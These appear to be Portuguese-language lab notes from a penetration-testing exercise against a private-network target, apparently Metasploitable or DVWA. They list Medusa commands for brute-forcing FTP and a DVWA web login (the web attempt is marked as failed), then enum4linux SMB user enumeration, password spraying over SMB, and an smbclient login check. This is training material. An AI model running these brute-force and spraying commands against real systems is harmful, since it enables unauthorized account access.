###Ataque em ftp
medusa -h 192.168.56.102 -U users.txt -P pass.txt -M ftp -t 6
#validar o SUCCESS

###Ataque em sistema web (DVWA) %%%%% DEU ERRO %%%%%
medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http \
-m PAGE:'/dvwa/login.php' \
-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL-login failed' -t 6

###Ataque em cadeia, enum smb + password spraying
#procurar usuários reais (enum) no servidor smb (samba)
#e para evitar bloqueios por muitas tentativas no mesmo user, 
#faremos um teste inverso, a mesma senha para vários users (password spraying) 

enum4linux -a 192.168.56.102 | tee enum4_output.txt
less/cat enum4_output.txt #ler o arquivo gerado

#criando wordlist de users baseado no arquivo acima gerado
echo -e "user\nmsfadmin\n...." > smb_user.txt
echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt
#agora o ataque em si
medusa -h 192.168.56.102 -U smb_user.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
#testando o acesso smbclient
smbclient -L //192.168.56.102 -U msfadmin